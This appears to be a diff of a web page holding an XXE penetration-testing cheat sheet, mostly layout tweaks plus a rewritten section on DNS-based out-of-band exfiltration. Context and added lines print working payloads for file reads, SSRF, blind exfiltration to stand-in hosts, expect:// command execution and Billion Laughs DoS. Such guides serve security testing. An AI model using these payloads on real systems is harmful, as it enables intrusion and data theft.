@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=e79ac60">
+  <link rel="stylesheet" href="/assets/style.css?v=9470351">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -833,6 +833,7 @@ graph LR
 </ul>
 <p>If the target matches any of these patterns and especially if it runs Java, it is worth spending time on XXE testing.</p>
 <p><strong>Tip:</strong> If the API only accepts JSON, do not give up immediately. Try sending an XML payload with <code>Content-Type: application/json</code> — some frameworks parse the body based on content rather than the declared content-type. This technique is covered in <a href="#content-type-switching">Content-Type Switching</a>.</p>
+<hr />
 <h2 id="testing-on-rest-apis">Testing on REST APIs</h2>
 <p>The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can start by reflecting a string from an internal entity to confirm entity processing, then escalate to reading a harmless file.</p>
 <p>Some scenarios would require further testing since the entry point of the attack would not properly reflect our payload in the response. In these cases we can rely on errors coming from the application to identify the exploitability.</p>
@@ -978,6 +979,7 @@ graph LR
 <hr />
 <h1 id="core-techniques">Core Techniques</h1>
 <p>These are the standard XXE exploitation techniques. They work on most vulnerable parsers and should be the first ones to try.</p>
+<hr />
 <h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
 <p>XML LFI payloads usually result in the application returning the contents of the file requested.</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
@@ -1019,6 +1021,7 @@ graph LR
 <p>Some notes on Windows paths: use forward slashes even on Windows (<code>file:///C:/path/to/file</code>) since backslashes are not valid characters in URIs (RFC 3986) and some parsers handle them inconsistently. UNC paths use <code>file:///\\server\share\file</code>. Some parsers also support alternate data streams: <code>file:///C:/path/file.txt:zone.identifier</code>. This works because the parser passes the path to the operating system, which resolves the ADS syntax natively on NTFS filesystems.</p>
 <h5 id="note-on-unc-path-syntax">Note on UNC path syntax</h5>
 <p>The forward slash rule applies to local Windows file paths (<code>file:///C:/path/to/file</code>). UNC paths are an exception — they require the double backslash notation (<code>\\server\share\file</code>) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (<code>file:////server/share/file</code>), but backslash notation is more broadly supported for UNC across Java-based parsers.</p>
+<hr />
 <h2 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h2>
 <p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.</p>
 <p>The basic SSRF payload makes the parser request an internal URL:</p>
@@ -1046,6 +1049,7 @@ graph LR
 &lt;!ENTITY xxe SYSTEM "http://10.0.0.1/"&gt;
 &lt;!ENTITY xxe SYSTEM "http://172.16.0.1/"&gt;</code></pre>
 <p>The parser behavior reveals information about the target: a connection refused error means the port is closed, a timeout suggests a firewall is filtering traffic, and actual content in the response confirms the service is running and accessible. Even when the response is not reflected directly, timing differences between open and closed ports can confirm which services are running.</p>
+<hr />
 <h2 id="out-of-band-oob-exfiltration-via-malicious-dtds">Out-of-Band (OOB) Exfiltration via Malicious DTDs</h2>
 <p>Up to this point, all techniques assume the server sends back the file content or error message in its response. But what happens when the application does not return anything useful? The response is a generic 200 OK or blank page, and nothing we inject shows up anywhere. This is called <strong>blind XXE</strong> — the vulnerability exists but we cannot see the output directly.</p>
 <p>The solution is to make the server send the data somewhere else — to a server we control. This is the "out-of-band" part: instead of reading the data in the response, we receive it on a separate channel. The XML parser's ability to fetch external resources works in our favor here because we can make it send HTTP requests that contain the stolen data in the URL.</p>
@@ -1098,7 +1102,7 @@ graph LR
 <p><strong>Tip:</strong> Use an IP address if DNS resolution is unreliable. Ensure the protocol (HTTP/HTTPS) matches what the target can access.</p>
 <h3 id="step-4-monitor-oob-interaction">Step 4: Monitor OOB Interaction</h3>
 <p>Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation. When the parser processes the malicious DTD, you should see an HTTP request to your Collaborator domain with the contents of <code>/etc/passwd</code> in the query string.</p>
-<p><a href="https://portswigger.net/web-security/xxe/blind">What is a blind XXE attack? Tutorial &amp; Examples | Web Security Academy</a></p>
+<hr />
 <h2 id="error-based-blind-xxe">Error-Based Blind XXE</h2>
 <p>OOB exfiltration requires the server to make outbound HTTP connections to our server. But what if the firewall blocks all outbound traffic? In that case, data cannot leave the network through HTTP requests. However, there is another channel we can use: <strong>error messages</strong>.</p>
 <p>Many applications return error details when something goes wrong during XML parsing. If we can force the parser to include file contents inside an error message, we can read the data without any outbound connection. The trick is to make the parser try to access a non-existent file path that contains the stolen data. When the parser fails to open <code>file:///nonexistent/&lt;contents of /etc/passwd&gt;</code>, it generates an error message that includes the full path it tried to resolve — and that path contains the file contents we want.</p>
@@ -1132,6 +1136,7 @@ graph LR
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/&amp;#x25;file;'&gt;"&gt;
 %eval;
 %error;</code></pre>
+<hr />
 <h2 id="denial-of-service_1">Denial of Service</h2>
 <p>XML has a feature that allows expanding entities in a recursive way by referencing them in a loop. While this cannot be considered an external entity attack, it is worth mentioning due to the impact it may cause in the application. If the parser is not well configured those entities will keep being called until the application consumes its resources. The most famous resource exhaustion attack is the Billion Laughs DoS. While this attack is mostly mitigated in modern XML parsers, it provides very useful context on how XML works.</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="utf-8"?&gt;
@@ -1154,6 +1159,7 @@ graph LR
 <hr />
 <h1 id="intermediate-techniques">Intermediate Techniques</h1>
 <p>These techniques require specific context to work: a particular entry point (SOAP, file upload), a specific parser behavior (XInclude support) or a misconfiguration in content negotiation. They are not rare but they depend on the target environment.</p>
+<hr />
 <h2 id="xxe-via-file-upload">XXE via File Upload</h2>
 <p>Many file formats that look harmless actually use XML internally and if the server parses them with a vulnerable parser we can inject our payloads.</p>
 <h3 id="svg-file-upload">SVG File Upload</h3>
@@ -1204,6 +1210,7 @@ cd ..</code></pre>
 <p>Same extraction/repackaging process as XLSX.</p>
 <h3 id="general-strategy">General strategy</h3>
 <p>The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, XML, XHTML): include a basic entity, upload, check output. If output is not reflected use blind XXE. Some servers validate MIME types so you may need to craft polyglot files.</p>
+<hr />
 <h2 id="xxe-in-soap">XXE in SOAP</h2>
 <h3 id="what-is-soap">What is SOAP</h3>
 <p>SOAP is a protocol for sending structured messages between applications over a network. It uses XML to format those messages and HTTP as the most common transport, though it is not limited to either. It was widely adopted in enterprise systems — financial services, government, healthcare — as a standard way for applications to call functions on remote servers, and many of those deployments are still running today.</p>
@@ -1286,6 +1293,7 @@ cd ..</code></pre>
 <h3 id="practical-takeaway">Practical Takeaway</h3>
 <p>SOAP XXE is best approached as a parsing pipeline problem: the question is always whether entity resolution can occur before or during the point at which the stack detects and rejects the DOCTYPE. That window exists in implementations where DOCTYPE detection is delegated to the XML parser rather than enforced before parsing begins, and its exploitability depends on the specific stack and configuration.</p>
 <p>From a testing perspective: start with body injection using a safe entity (an internal entity referencing a literal string, then <code>/etc/hostname</code>). If the message is rejected with a DOCTYPE or DTD-related error, the stack is enforcing a DTD check at some point in the pipeline — though the error alone does not indicate whether entity resolution had already occurred before that check. If body injection produces no output but is not rejected, escalate to header injection, then to WS-Addressing with a blind OOB payload to determine whether entity resolution is occurring silently. If none of those produce results, consider XInclude as an alternative, bearing in mind that XInclude processing must be explicitly enabled in most parsers and is off by default in many common implementations — it is worth attempting only where there is reason to believe XInclude support is active.</p>
+<hr />
 <h2 id="xxe-via-xinclude">XXE via XInclude</h2>
 <p>XInclude is an XML specification that allows including external content directly inside an XML document. It does not require a <code>&lt;!DOCTYPE&gt;</code> declaration, which makes it useful in two distinct scenarios: as an alternative when DOCTYPE processing has been explicitly disabled, and as an independent attack surface on any endpoint that processes XML with XInclude support enabled.</p>
 <p>The prerequisite is important to state upfront: In many common parser stacks, XInclude processing is disabled by default and must be explicitly enabled by the application — for example via <code>setXIncludeAware(true)</code> in Xerces-based parsers. This is the opposite of the standard XXE situation, where Java parsers are vulnerable by default and need to be hardened. Here, the developer has to opt in. The practical implication is that XInclude is not a universal fallback — it is only available where the application has deliberately enabled it.</p>
@@ -1329,6 +1337,7 @@ cd ..</code></pre>
   &lt;/content&gt;
 &lt;/document&gt;</code></pre>
 <p>If the file is readable the contents appear in the response. If it is not, the fallback text appears instead. The distinction between these two responses allows filesystem enumeration without relying on error messages.</p>
+<hr />
 <h2 id="content-type-switching">Content-Type Switching</h2>
 <p>Some APIs accept multiple content types and internally convert between formats. Many parsers don't validate the actual content against the declared content-type so we can try submitting XML payloads with different headers.</p>
 <h3 id="json-to-xml">JSON to XML</h3>
@@ -1344,6 +1353,7 @@ Content-Type: application/json
 &lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
 <h3 id="testing-strategy">Testing strategy</h3>
 <p>APIs with poor input validation might accept <code>text/xml</code>, <code>application/xml</code>, <code>application/json</code>, <code>text/plain</code> or even missing content-types with XML content. Try the XXE payload with various content-type headers, with null/missing headers, and with charset parameters (<code>application/xml; charset=utf-8</code>).</p>
+<hr />
 <h2 id="handling-files-with-xml-special-characters">Handling Files with XML-Special Characters</h2>
 <p>When targeting files that contain special XML characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>) direct entity inclusion fails because those characters break XML parsing. This is a common limitation when trying to read config files, HTML files or source code.</p>
 <p>CDATA sections theoretically allow inclusion of raw content without XML interpretation, but entity expansion does not occur within CDATA sections — so wrapping the entity reference directly in CDATA does not work:</p>
@@ -1372,6 +1382,7 @@ Content-Type: application/json
 <hr />
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
+<hr />
 <h2 id="repurposing-local-dtds-blind-xxe">Repurposing Local DTDs (Blind XXE)</h2>
 <p>When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access.</p>
 <h3 id="why-enumerate-the-filesystem">Why Enumerate the Filesystem?</h3>
@@ -1402,7 +1413,6 @@ grep -n '%[a-zA-Z][a-zA-Z0-9.]*;' target.dtd    # list all parameter entity refe
 <li>If it appears as a standalone call like <code>%ISOamso;</code> at the root of the DTD → <strong>root-level injection point</strong></li>
 </ul>
 <p>When a DTD offers both types, root-level injection points tend to produce simpler payloads, though both are equally valid paths to exploitation.</p>
-<hr />
 <h3 id="common-dtd-paths-linux">Common DTD Paths — Linux</h3>
 <pre class="highlight"><code>/usr/share/xml/fontconfig/fonts.dtd
 /usr/share/yelp/dtd/docbookx.dtd
@@ -1427,7 +1437,6 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 ]&gt;
 &lt;message&gt;&lt;/message&gt;</code></pre>
 <p>Error-based feedback indicates successful DTD loading. If we get a different error than “No such file or directory” or no error at all we know the file exists.</p>
-<hr />
 <h3 id="exploitation-using-fontsdtd">Exploitation Using fonts.dtd</h3>
 <p><code>fonts.dtd</code> defines <code>%expr;</code>, which is referenced inside multiple <code>&lt;!ELEMENT&gt;</code> declarations — making it a declaration-embedded injection point. This requires structural padding to produce a syntactically valid payload.</p>
 <ul>
@@ -1520,7 +1529,6 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. Remember that the closing delimiter <code>'</code> of the entity value is not part of the injected content — the padding ends with <code>(placeholder</code>, and the remainder of the original declaration provides the closing <code>)</code>.</li>
 <li><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every resulting <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> is syntactically complete. Parentheses should balance cleanly. If they do not, choose a different injection point.</li>
 </ol>
-<hr />
 <h3 id="exploitation-using-docbookxdtd">Exploitation Using docbookx.dtd</h3>
 <p>Both techniques exploit the same fundamental mechanism — overriding a parameter entity to inject the exfiltration chain into an external DTD context where parameter entity chaining is permitted. The difference is purely structural: with a root-level injection point the overridden entity expands outside any markup declaration, so no declaration needs breaking open and no padding is required.</p>
 <p><code>docbookx.dtd</code> defines a set of ISO character entity sets as parameter entities that are expanded directly at root level:</p>
@@ -1565,7 +1573,6 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
   If the application returns error messages, the response will include something like:</li>
 </ul>
 <pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
-<hr />
 <h3 id="requirements-for-robust-payloads">Requirements for Robust Payloads</h3>
 <p>Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:</p>
 <ol>
@@ -1639,19 +1646,51 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <p>The W3C XML specification forbids parameter entity chaining within the internal DTD subset — this is the restriction that makes the basic error-based payload unreliable in spec-compliant parsers, as explained in the <a href="#error-based-blind-xxe">Error-Based Blind XXE</a> section.</p>
 <p>This technique sidesteps that restriction entirely. Rather than chaining parameter entities inside the internal subset, we use the internal subset only to <strong>redefine</strong> an entity that already exists in the local DTD. Because entity declarations follow a first-definition-wins rule, our override takes effect before the original declaration in the DTD is reached.</p>
 <p>When <code>%local_dtd;</code> is then expanded, execution moves into the external DTD context — where parameter entity chaining is explicitly permitted by the spec. The malicious logic embedded inside the overridden entity executes there, not in the internal subset, which is why spec-compliant parsers do not reject it. This holds true for both injection types — the type determines the payload structure, not the underlying mechanism.</p>
+<hr />
 <h2 id="dns-based-oob-exfiltration">DNS-Based OOB Exfiltration</h2>
-<p>When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration provides an alternative. DNS traffic is rarely fully blocked so even if the HTTP request never reaches us, the DNS query still happens when the parser tries to resolve the domain:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.attacker.com/'&gt;"&gt;
-%eval;
-%exfiltrate;</code></pre>
-<p>Services like <strong>Interactsh</strong> provide automatic DNS logging:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.interactsh-domain.com/'&gt;"&gt;
-%eval;
-%exfiltrate;</code></pre>
-<p>There are two important limitations to keep in mind. First, DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. Second — and this is easy to overlook — DNS labels only accept alphanumeric characters (a-z, 0-9) and hyphens. Characters like <code>:</code>, <code>/</code>, newlines and spaces will break the query. Since files like <code>/etc/passwd</code> are full of these characters, the payloads above will only work as-is for files with very simple content (like <code>/etc/hostname</code> which is typically a single word).</p>
-<p>To exfiltrate anything meaningful we need to encode the data before embedding it in the subdomain. Base32 is the safest option because its output only contains A-Z and 2-7 — all valid DNS characters. Base64 works in some contexts but its output includes <code>+</code>, <code>/</code> and <code>=</code> which are also invalid in labels. In PHP environments we can combine <code>php://filter/convert.base64-encode</code> with the exfiltration payload to get clean ASCII before it hits the DNS query. For files longer than 63 characters, split the encoded data into chunks across multiple labels or multiple queries.</p>
+<p>The standard OOB exfiltration technique covered in <a href="#out-of-band-oob-exfiltration-via-malicious-dtds">Out-of-Band Exfiltration via Malicious DTDs</a> requires the parser to load an external DTD over HTTP and then make a second outbound HTTP request to deliver the stolen data. Both steps, in the common HTTP-based OOB pattern, depend on outbound TCP connectivity. In environments where egress filtering blocks outbound TCP connections, neither step completes — the DTD never loads, and the data never arrives.</p>
+<p>DNS provides an alternative channel. When the parser attempts to resolve a hostname, that query typically goes first to the system-configured resolver over UDP/53. If that resolver can resolve the attacker's domain, the query will eventually reach the attacker-controlled authoritative nameserver — without requiring a direct TCP connection from the target machine. DNS resolution is not always UDP, and the path to the authoritative nameserver is not necessarily direct, but DNS traffic is rarely subject to the same egress filtering as outbound HTTP, which is what makes it a viable fallback channel.</p>
+<p>This technique is only applicable under two conditions. First, the firewall blocks outbound TCP but permits DNS resolution to propagate externally. Second — and this is the critical constraint — the XML parser must tolerate parameter entity chaining inside the internal DTD subset. The W3C XML specification clearly states that parameter entity references cannot appear within markup declarations in the internal subset. Spec-compliant parsers, including many modern parser implementations, will reject this payload. Parsers that do not enforce this restriction process the chaining anyway. The reason this matters is that without inline chaining the entire payload cannot be self-contained — and loading an external DTD requires outbound TCP, which is the channel we are trying to avoid. If inline chaining is rejected, a local-DTD repurposing approach may still work in no-outbound-TCP environments, provided the application exposes a usable error channel — see <a href="#repurposing-local-dtds-blind-xxe">Repurposing Local DTDs (Blind XXE)</a>.</p>
+<h3 id="how-the-exfiltration-channel-works">How the Exfiltration Channel Works</h3>
+<p>The parser constructs a URL using the expanded value of <code>%file;</code> as the hostname component and attempts to resolve it. Tools like <strong>Burp Collaborator</strong> and <strong>Interactsh</strong> act as authoritative DNS servers for their respective domains (<code>oastify.com</code> and <code>oast.pro</code>) and log every subdomain queried under any identifier they issue, including arbitrary prefixes. A query for <code>prod-server-01.abc123.oastify.com</code> is logged with the full subdomain intact — <code>prod-server-01</code> is the exfiltrated data. No HTTP connection needs to complete for the interaction to be captured. PortSwigger documents this explicitly: a vulnerable application may perform a DNS lookup first and then may or may not initiate a subsequent network connection such as HTTP.</p>
+<h3 id="limitations">Limitations</h3>
+<p>Two hard constraints define what is exfiltrable via DNS in the straightforward form shown in this section.</p>
+<p><strong>DNS label charset.</strong> DNS labels only accept alphanumeric characters (<code>a-z</code>, <code>0-9</code>) and hyphens. Characters like <code>:</code>, <code>/</code>, newlines and spaces are invalid and will cause the parser to reject the constructed URL or produce an unparseable query. <code>/etc/hostname</code> is the canonical target precisely because it is typically a short alphanumeric string with no special characters. <code>/etc/passwd</code> fails immediately — it contains <code>:</code>, <code>/</code> and newlines on every line.</p>
+<p><strong>DNS length limits.</strong> Each label is capped at 63 characters and the full domain name cannot exceed 253 characters. Since the Collaborator or Interactsh identifier itself consumes a significant portion of that budget, the space available for exfiltrated data in a single query is short.</p>
+<p>For content that contains non-DNS-safe characters or spans multiple lines, encoding is required before the data can be embedded in a label. Base32 is the most suitable encoding for this channel — its output only contains <code>A-Z</code> and <code>2-7</code>, all valid DNS characters. Base64 is not suitable because its output includes <code>+</code>, <code>/</code> and <code>=</code>, which are invalid in labels. However, there is no native mechanism in the XML parser to pre-encode the expanded value of <code>%file;</code> before it is interpolated into the URL — PHP's <code>php://filter</code> wrappers can base64-encode file contents (see <a href="#php-wrappers">PHP Wrappers</a>), but Base64 output is not DNS-safe, and there is no equivalent Base32 filter available natively. Implementing encoding for DNS exfiltration inline is therefore not straightforward. In practice, tooling is often used to automate chunking, payload generation, and correlation for DNS-based exfiltration workflows. For the direct, unencoded approach described here, single-line DNS-safe files are the realistic target.</p>
+<h3 id="setup">Setup</h3>
+<p>You need an authoritative nameserver for a domain you control, configured to log all incoming queries. Two practical options:</p>
+<p><strong>Burp Collaborator</strong> (Burp Suite Professional): Generate a payload from the Collaborator tab. This gives you an identifier like <code>abc123.oastify.com</code>. Burp is the authoritative nameserver for <code>oastify.com</code> and logs every subdomain queried under your identifier. Poll the Collaborator tab after sending the payload to see logged interactions.</p>
+<p><strong>Interactsh</strong>: Open source alternative by ProjectDiscovery. Once running, it provides a unique domain like <code>abc123.oast.pro</code> and displays incoming interactions in real time, including the full subdomain of every DNS query received. The exfiltrated data will appear as a prefix to your unique identifier. Refer to the <a href="https://github.com/projectdiscovery/interactsh">Interactsh GitHub repository</a> for installation and usage instructions.</p>
+<h3 id="confirming-parser-compatibility">Confirming Parser Compatibility</h3>
+<p>Before attempting exfiltration, verify that the target parser tolerates parameter entity chaining in the internal subset. Send this probe:</p>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; probe SYSTEM 'http://canary.YOUR-IDENTIFIER.oastify.com/'&gt;"&gt;
+  %eval;
+  %probe;
+]&gt;
+&lt;foo&gt;&lt;/foo&gt;</code></pre>
+<p>If you receive a DNS interaction on <code>canary.YOUR-IDENTIFIER.oastify.com</code>, the parser tolerates chaining and the technique is viable. If the parser returns a <code>parameter entity references are not allowed in internal DTD subsets</code> error, it is spec-compliant — use <a href="#repurposing-local-dtds-blind-xxe">Repurposing Local DTDs (Blind XXE)</a> instead.</p>
+<p>Note that receiving a DNS interaction without a corresponding HTTP callback is consistent with TCP egress filtering at the network layer, but is not conclusive on its own. Other reasons include connection timeouts, resolver-level failures, the application aborting before opening the HTTP connection, or other network-level restrictions that are unrelated to egress filtering.</p>
+<h3 id="exfiltration-payload">Exfiltration Payload</h3>
+<p>The entire chain runs inline in the internal DTD subset, with no external DTD required:</p>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://%file;.YOUR-IDENTIFIER.oastify.com/'&gt;"&gt;
+  %eval;
+  %exfil;
+]&gt;
+&lt;foo&gt;&lt;/foo&gt;</code></pre>
+<p>Replace <code>YOUR-IDENTIFIER.oastify.com</code> with your Collaborator payload or Interactsh domain.</p>
+<p><strong>Explanation:</strong></p>
+<ul>
+<li><code>%file;</code> loads the contents of <code>/etc/hostname</code> — for example, <code>prod-server-01</code>.</li>
+<li><code>%eval;</code> expands and defines <code>%exfil;</code> as an entity whose SYSTEM identifier is <code>http://prod-server-01.YOUR-IDENTIFIER.oastify.com/</code>.</li>
+<li><code>%exfil;</code> triggers the parser to attempt to resolve that hostname. The DNS query propagates through the resolver chain and reaches your authoritative nameserver, logging <code>prod-server-01</code> as the prefix — regardless of whether the subsequent TCP connection completes.</li>
+</ul>
+<hr />
 <h2 id="php-wrappers">PHP Wrappers</h2>
 <p>PHP's XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.</p>
 <h3 id="expect-wrapper-environment-specific-rce">expect:// Wrapper (Environment-Specific RCE)</h3>
@@ -1668,7 +1707,6 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 &lt;!ENTITY xxe SYSTEM "expect://whoami"&gt;</code></pre>
 <h5 id="character-restrictions-in-expect-uris">⚠️ Character restrictions in expect:// URIs</h5>
 <p>There is a catch when running commands with arguments: PHP's XML parser treats the <code>expect://</code> URI literally and rejects it if it contains spaces, <code>&gt;</code>, <code>&amp;</code> or other special characters. A payload like <code>expect://cat /etc/passwd</code> will fail with an "Invalid URI" error. URL encoding (<code>%20</code>, <code>+</code>) does not help — the parser does not decode it. XML character references (<code>&amp;#x20;</code>) do not work either.</p>
-<hr />
 <p>The workaround is to replace spaces with <code>$IFS</code> — the shell Internal Field Separator variable. When the next argument starts with letters, wrap it in single quotes so the shell does not try to read it as part of the variable name:</p>
 <pre class="highlight"><code class="language-xml">&lt;!-- cat /etc/passwd → replace spaces with $IFS --&gt;
 &lt;!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd"&gt;
@@ -1701,6 +1739,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code></pre>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "data://text/plain,malicious content"&gt;</code></pre>
 <p><code>zip://</code> reads files from ZIP archives without extraction. Useful for attacking uploaded XLSX/DOCX:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "zip:///path/to/archive.zip#filename.xml"&gt;</code></pre>
+<hr />
 <h2 id="java-protocol-exploitation">Java Protocol Exploitation</h2>
 <p>Java's XML parsers support additional protocols. These only apply when the target runs Java.</p>
 <h3 id="jar-protocol-environment-specific-escalation">jar:// Protocol (Environment-Specific Escalation)</h3>
@@ -1972,6 +2011,6 @@ ruby server.rb</code></pre>
       });
     });
   </script>
-  <script src="/assets/main.js?v=e79ac60" defer></script>
+  <script src="/assets/main.js?v=9470351" defer></script>
 </body>
 </html>
